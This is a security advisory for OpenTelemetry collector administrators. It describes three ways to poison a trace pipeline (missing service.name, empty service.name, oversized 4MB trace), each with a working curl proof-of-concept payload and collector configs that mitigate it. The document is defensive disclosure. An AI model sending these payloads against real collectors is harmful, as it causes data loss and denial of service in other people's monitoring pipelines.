# OpenTelemetry trace pipeline poisoning

Audience: OpenTelemetry collector administrators

Tested version: ADOT v0.21.0 = OTEL v0.58.0

You have typical trace pipeline configured in your OTEL collector config:

```
receivers:
  otlp:
    protocols:
      grpc:
      http:

processors:
  batch:

exporters:
  otlp:
    endpoint: ${OTLP_GRPC_URL}

service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [batch]
      exporters: [otlp]
```

## Attacks

### Attack #1 - missing service.name

Problem is that OTEL has mandatory resource label `service.name`. If some
trace in the batch doesn't have `service.name` specified (poisoned trace),
then whole batch will be rejected by used OTEL backend (tested with Lightstep,
Cribl). If attacker is able to generate poisoned traces quickly (by default
`batch` processor `timeout` is 200ms), then all batches will be poisoned and
rejected. Example error message in the collector logs from the trace
destination:
```
# Lightstep returns not retryable error - batch is dropped immediately:
"msg":"Exporting failed. The error is not retryable. Dropping data.",
"error":"Permanent error: rpc error: code = InvalidArgument desc = Invalid runtime in Report (missing or empty service name)"

# Cribl returns retryable error - trace is going back to queue to be retried:
"msg":"Exporting failed. Will retry the request after interval.",
"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"
```

Linux POC script:
```
# use HTTP endpoint (usually /v1/traces), not GRPC endpoint
export HTTP_TRACE_ENDPOINT=<HTTP-COLLECTOR-TRACE-ENDPOINT>

# add auth header(s) if authentication is required
curl -v -X POST $HTTP_TRACE_ENDPOINT \
-H 'Content-Type: application/json' \
--data-binary @- << EOF
{
 "resourceSpans": [{
  "resource": {
   "attributes": [{
    "key": "script-attack",
    "value": {
     "stringValue": "trace-pipeline-poisoning"
    }
   }]
  },
  "scope_spans": [{
   "spans": [{
    "traceId": "5661215315a87ad7dd8448b4101a59a9",
    "spanId": "29f50492db6b0ced",
    "name": "demo-operation",
    "kind": 1,
    "startTimeUnixNano": 1631649350122333000,
    "endTimeUnixNano": 1631649350777700000,
    "attributes": [],
    "droppedAttributesCount": 0,
    "events": [{
     "timeUnixNano": 1631649350777700000,
     "name": "fetching-span1-completed",
     "attributes": [],
     "droppedAttributesCount": 0
    }],
    "droppedEventsCount": 0,
    "status": {
     "code": 0
    },
    "links": [],
    "droppedLinksCount": 0
   }]
  }]
 }]
}
EOF
```

### Mitigation of missing service.name

Don't export any traces without `service.name` from the collector.
Use [resource processor](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/processor/resourceprocessor)
and add predefined value if `service.name` is missing. For example:
```
receivers:
  otlp:
    protocols:
      grpc:
      http:

processors:
  batch:
  resource:
    attributes:
      - key: service.name
        value: not-specified-service
        action: insert

exporters:
  otlp:
    endpoint: ${OTLP_GRPC_URL}

service:
  pipelines:
    traces:
      receivers: [otlp]
      processors: [batch, resource]
      exporters: [otlp]
```

### Attack #2 - empty service.name

It is only variation of attack #1.

Linux POC script:
```
# use HTTP endpoint(usually /v1/traces), not GRPC endpoint
export HTTP_TRACE_ENDPOINT=<HTTP-COLLECTOR-TRACE-ENDPOINT>

# add auth header(s) if authentication is required
curl -v -X POST $HTTP_TRACE_ENDPOINT \
-H 'Content-Type: application/json' \
--data-binary @- << EOF
{
 "resourceSpans": [{
  "resource": {
   "attributes": [{
    "key": "service.name",
    "value": {
     "stringValue": ""
    }
   }]
  },
  "scope_spans": [{
   "spans": [{
    "traceId": "5661215315a87ad7dd8448b4101a59a9",
    "spanId": "29f50492db6b0ced",
    "name": "demo-operation",
    "kind": 1,
    "startTimeUnixNano": 1631649350122333000,
    "endTimeUnixNano": 1631649350777700000,
    "attributes": [],
    "droppedAttributesCount": 0,
    "events": [{
     "timeUnixNano": 1631649350777700000,
     "name": "fetching-span1-completed",
     "attributes": [],
     "droppedAttributesCount": 0
    }],
    "droppedEventsCount": 0,
    "status": {
     "code": 0
    },
    "links": [],
    "droppedLinksCount": 0
   }]
  }]
 }]
}
EOF
```

### Mitigation of empty service.name

Use filter, resource processor to set predefined value for empty service name.
Combined mitigation of #1/#2 may looks like:
```
receivers:
  otlp:
    protocols:
      grpc:
      http:

processors:
  batch:
  filter/include-empty-servicename:
    spans:
      exclude:
        match_type: regexp
        resources:
          Key: service.name
          Value: .+
  filter/exclude-empty-servicename:
    spans:
      include:
        match_type: regexp
        resources:
          Key: service.name
          Value: .+
  resource/add-missing-servicename:
    attributes:
      - key: service.name
        value: not-specified-service
        action: insert
  resource/upsert-servicename:
    attributes:
      - key: service.name
        value: not-specified-service
        action: upsert

exporters:
  otlp:
    endpoint: ${OTLP_GRPC_URL}

service:
  pipelines:
    traces/nonempty-servicename:
      receivers: [otlp/public]
      processors: [batch, filter/exclude-empty-servicename, resource/add-missing-servicename]
      exporters: [otlp]
    traces/empty-servicename:
      receivers: [otlp/public]
      processors: [batch, filter/include-empty-servicename, resource/upsert-servicename]
      exporters: [otlp]
```

In theory also `transform` processor may mitigate this issue.

### Attack #3 - huge 4MB trace

Default GRPC Golang based server accepts 4MB message size. You need to exceed
this limit in the batch and then whole batch will be rejected and traces dropped
immediately. Example error message in the collector logs from the trace
destination:
```
# Lightstep returns not retryable error - batch is dropped immediately:
"msg":"Exporting failed. The error is not retryable. Dropping data.",
"error":"Permanent error: rpc error: code = ResourceExhausted desc = grpc: received message after decompression larger than max (5194526 vs. 4194304)"

# Cribl returns retryable error - trace is going back to queue to be retried:
"msg":"Exporting failed. Will retry the request after interval.",
"error":"rpc error: code = DeadlineExceeded desc = context deadline exceeded"
```

Linux POC script:
```
export HTTP_TRACE_ENDPOINT=https://internal.collector.tracing-dev.autodesk.com/v1/traces

cat <<EOF > ./hugetrace.json
{
 "resourceSpans": [{
  "resource": {
   "attributes": [{
     "key": "service.name",
     "value": {
      "stringValue": "trace-pipeline-poisoning"
     }
    },
    {
     "key": "payload",
     "value": {
      "stringValue": "$(awk 'BEGIN {while (i++ < 4194304) printf "1"}')"
     }
    }
   ]
  },
  "scope_spans": [{
   "spans": [{
    "traceId": "5661215315a87ad7dd8448b4101a59a9",
    "spanId": "29f50492db6b0ced",
    "name": "demo-operation",
    "kind": 1,
    "startTimeUnixNano": 1631649350122333000,
    "endTimeUnixNano": 1631649350777700000,
    "attributes": [],
    "droppedAttributesCount": 0,
    "events": [{
     "timeUnixNano": 1631649350777700000,
     "name": "fetching-span1-completed",
     "attributes": [],
     "droppedAttributesCount": 0
    }],
    "droppedEventsCount": 0,
    "status": {
     "code": 0
    },
    "links": [],
    "droppedLinksCount": 0
   }]
  }]
 }]
}
EOF

curl -v -X POST $HTTP_TRACE_ENDPOINT \
 -H 'Content-Type: application/json' \
 -d @hugetrace.json
```

### Mitigation of huge 4MB trace

Unfortunately, there is no mitigation on the OpenTelemetry collector side, which
can prevent this kind of attack. You can only limit occurence with right 
[batching configuration](https://github.com/open-telemetry/opentelemetry-collector/tree/main/processor/batchprocessor)
, which won't exceed default 4MB GRPC message size.

Example of batch sizing:

Max size of trace, which was observed in real implementation was 400kB (Let's 
simplify it and let's assume that only 1 span was used). With default batching 
config (max 8k spans, every 200ms) we can process only ~50 traces with 400kB 
size per second without reaching default 4MB GRPC message size limit. Probably
batching processor will need some adjustment for this worst use case.

[OTEL issue](https://github.com/open-telemetry/opentelemetry-collector/issues/6046)
, which can mitigate this problem.

## Recomendation

Generaly, [monitor OTEL collector](https://github.com/monitoringartist/opentelemetry-collector-monitoring)
and alert on thee cases, when exporters are failing to export traces.
